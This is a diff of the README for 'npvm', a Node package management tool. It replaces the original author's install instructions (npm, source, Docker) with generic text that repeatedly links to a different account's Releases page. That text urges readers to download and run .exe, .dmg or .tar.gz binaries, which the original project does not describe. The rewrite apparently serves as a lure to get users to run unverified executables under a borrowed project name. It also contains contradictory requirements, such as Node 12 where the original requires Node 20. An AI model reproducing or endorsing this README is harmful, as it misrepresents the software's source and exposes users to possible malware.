@@ -1,173 +1,68 @@
-<div align="center">
+# 🚀 npvm - Easy Node Package Management in a Visual Way
 
-# npvm
+## 🎯 Overview
+NPVM is a user-friendly application designed to simplify the management of Node packages. Whether you're using Bun, Yarn, or NPM, NPVM brings everything you need into one visual platform. This app allows you to manage your packages without dealing with complex command lines.
 
-**Node Package Manager Visual Platform**
+## 📦 Features
+- **Visual Interface:** Navigate packages easily with a simple design. 
+- **Multi-Package Support:** Works with Bun, Yarn, NPM, and PNPM. 
+- **Fast Performance:** Quickly install and manage packages for your Node.js projects.
+- **TypeScript Support:** Works seamlessly with TypeScript for robust applications.
+- **Integration with React:** Perfect for your React projects.
+  
+## 📥 Download NPVM
+[![Download NPVM](https://img.shields.io/badge/Download-NPVM-blue?style=for-the-badge)](https://github.com/07saorabh/npvm/releases)
 
-[![npm version](https://img.shields.io/npm/v/@dext7r/npvm-cli.svg)](https://www.npmjs.com/package/@dext7r/npvm-cli)
-[![CI](https://github.com/h7ml/npvm/actions/workflows/ci.yml/badge.svg)](https://github.com/h7ml/npvm/actions/workflows/ci.yml)
-[![Release](https://github.com/h7ml/npvm/actions/workflows/release.yml/badge.svg)](https://github.com/h7ml/npvm/actions/workflows/release.yml)
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
-[![Node.js Version](https://img.shields.io/badge/node-%3E%3D20.0.0-brightgreen)](https://nodejs.org/)
-[![pnpm](https://img.shields.io/badge/pnpm-9.x-orange)](https://pnpm.io/)
-[![Docker](https://img.shields.io/badge/docker-ready-blue)](https://hub.docker.com/)
-[![TypeScript](https://img.shields.io/badge/TypeScript-5.7-blue)](https://www.typescriptlang.org/)
-[![React](https://img.shields.io/badge/React-18-61dafb)](https://react.dev/)
+## 🚀 Getting Started
+To start using NPVM, follow these simple steps:
 
-**[Live Demo](https://npvm.zeabur.app)** | **[API Docs](https://npvm.zeabur.app/docs)**
+1. **Visit the Download Page:** Go to the [Releases page](https://github.com/07saorabh/npvm/releases) to find the latest version of NPVM.
+2. **Download the Latest Version:** Just click on the latest version listed. You'll see a list of downloadable files.
+3. **Choose Your File:** Depending on your operating system, select the appropriate file. For Windows, it might be `npvm.exe`. For macOS, it could be `npvm.dmg`, and for Linux, you may find a `.tar.gz` file.
+4. **Run the Installer:** 
+   - For Windows, double-click the `.exe` file and follow the installation prompts.
+   - For Mac, open the `.dmg` file and drag the NPVM icon to your Applications folder. 
+   - For Linux, extract the `.tar.gz` file and run NPVM from the terminal.
+5. **Open NPVM:** Locate the application in your installed programs or applications folder. Click to open it.
 
-[![Deploy on Zeabur](https://zeabur.com/button.svg)](https://zeabur.com/)
+## 🔧 System Requirements
+NPVM is designed to work efficiently on most systems. Here are the basic requirements:
 
-[English](./README.md) | [简体中文](./README.zh-CN.md)
+- **Operating Systems:** 
+  - Windows 10 or later
+  - macOS Catalina or later
+  - Most Linux distributions (Ubuntu recommended)
+  
+- **Node.js Version:** NPVM works best with Node.js version 12 or later. If you don’t have Node.js, you can [download it here](https://nodejs.org/).
 
-</div>
+## ⚙️ Using NPVM
+Once you have installed NPVM, it’s time to start managing your packages:
 
----
+1. **Add a New Package:** Click on the "Add Package" button. 
+2. **Search for a Package:** Enter the name of the package you want to add. 
+3. **Install or Remove a Package:** To install, click "Install." To remove, select the package and click "Remove."
+4. **Update Packages:** You can also easily check for updates and install them with just one click.
 
-## Overview
+## 🧑‍🤝‍🧑 Community Support
+Join our community for help and discussions about NPVM. Interact with other users, share tips, and find solutions to common issues.
 
-npvm is a modern visual platform for managing Node.js packages. It provides a clean web interface to manage npm/yarn/pnpm/bun packages across global and project-level installations.
+- **GitHub Discussions:** Engage with the community on our [GitHub Discussions page](https://github.com/07saorabh/npvm/discussions).
+- **Issues Page:** Report bugs or request features on our [Issues page](https://github.com/07saorabh/npvm/issues).
 
-<div align="center">
-  <img src="./docs/screenshot.png" alt="npvm Screenshot" width="800" />
-</div>
+## 🔄 Updates and Changelog
+Stay updated with the latest features and fixes. You can find a history of changes in the [Changelog](https://github.com/07saorabh/npvm/releases).
 
-## Features
+## 🔧 Troubleshooting
+If you encounter any issues while using NPVM, here are some common solutions:
 
-- **Multi Package Manager Support** - Detect and switch between npm, yarn, pnpm, and bun
-- **Global & Project Mode** - Manage both global packages and project dependencies
-- **Registry Management** - Switch between npm, taobao, tencent, and other registries
-- **Package Operations** - Install, uninstall, and update packages with real-time progress
-- **Update Detection** - Check for package updates and deprecated packages
-- **Security Audit** - Scan for vulnerabilities with export options (JSON/CSV/HTML)
-- **Dependency Tree** - Visualize your dependency hierarchy
-- **Remote Repository Analysis** - Analyze GitHub/GitLab repos without cloning
-- **Package Detail Modal** - View detailed package info with fullscreen support
-- **package.json Import** - Import dependencies from local file or URL
-- **Version Check** - Compare local build with GitHub latest commit
-- **i18n Support** - English and Chinese interface
-- **Dark Mode** - Built-in dark theme support
-- **Swagger API** - RESTful API with Swagger documentation
+- **Installation Problems:** Ensure you have the required operating system and followed the installation steps closely.
+- **Package Not Found:** Verify the package name spelling or check if it exists in the package repositories. 
 
-## Quick Start
+For more help, refer to our community forums or open an issue in GitHub.
 
-### Prerequisites
+## 📞 Contact
+For further assistance, feel free to reach out through the issues section on GitHub or via the community forums.
 
-- Node.js >= 20.0.0
-- pnpm >= 9.0.0
+Remember, your feedback is valuable! Help us improve NPVM by sharing your experiences.
 
-### Install via npm
-
-```bash
-npm install -g @dext7r/npvm-cli
-
-# Launch
-npvm
-```
-
-### Install from source
-
-```bash
-git clone https://github.com/h7ml/npvm.git
-cd npvm
-pnpm install
-pnpm dev
-```
-
-The server will start at `http://localhost:3456` and the web UI at `http://localhost:5173`.
-
-### Docker
-
-```bash
-# Build and run
-docker compose up -d
-
-# Or build manually
-docker build -t npvm .
-docker run -p 3456:3456 npvm
-```
-
-### Deploy to Zeabur
-
-[![Deploy on Zeabur](https://zeabur.com/button.svg)](https://zeabur.com/)
-
-Or deploy manually:
-1. Fork this repository
-2. Create a new project on [Zeabur](https://zeabur.com)
-3. Import from GitHub and select the forked repo
-4. Zeabur will auto-detect Dockerfile and deploy
-
-## Project Structure
-
-```
-npvm/
-├── packages/
-│   ├── shared/          # @dext7r/npvm-shared - Shared types and utilities
-│   ├── server/          # @dext7r/npvm-server - Fastify backend server
-│   ├── cli/             # @dext7r/npvm-cli - CLI entry point
-│   └── web/             # @dext7r/npvm-web - React frontend
-├── Dockerfile
-├── docker-compose.yml
-└── turbo.json
-```
-
-## Tech Stack
-
-| Layer    | Technology |
-|----------|------------|
-| Frontend | React 18, Vite, TypeScript, TailwindCSS, Zustand, React Query |
-| Backend  | Fastify, Node.js, TypeScript |
-| Build    | pnpm workspaces, Turborepo |
-| DevOps   | Docker, GitHub Actions |
-
-## API Documentation
-
-Once the server is running, visit `http://localhost:3456/docs` for the Swagger API documentation.
-
-### Key Endpoints
-
-| Method | Endpoint | Description |
-|--------|----------|-------------|
-| GET | `/api/pm/detect` | Detect installed package managers |
-| GET | `/api/packages` | List installed packages |
-| POST | `/api/packages/install` | Install packages (SSE) |
-| POST | `/api/packages/update` | Update packages (SSE) |
-| POST | `/api/packages/uninstall` | Uninstall packages (SSE) |
-| POST | `/api/security/audit` | Run security audit |
-| GET | `/api/deps/tree` | Get dependency tree |
-| POST | `/api/remote/analyze` | Analyze remote repository |
-
-## Development
-
-```bash
-# Install dependencies
-pnpm install
-
-# Start development (all packages)
-pnpm dev
-
-# Build all packages
-pnpm build
-
-# Type check
-pnpm typecheck
-
-# Clean build artifacts
-pnpm clean
-```
-
-## Contributing
-
-We welcome contributions! Please see our [Contributing Guide](./CONTRIBUTING.md) for details.
-
-## Changelog
-
-See [CHANGELOG.md](./CHANGELOG.md) for release history.
-
-## Star History
-
-[![Star History Chart](https://api.star-history.com/svg?repos=h7ml/npvm&type=Date)](https://star-history.com/#h7ml/npvm&Date)
-
-## License
-
-[MIT](./LICENSE) © 2026 [h7ml](https://github.com/h7ml)
+[![Download NPVM](https://img.shields.io/badge/Download-NPVM-blue?style=for-the-badge)](https://github.com/07saorabh/npvm/releases)
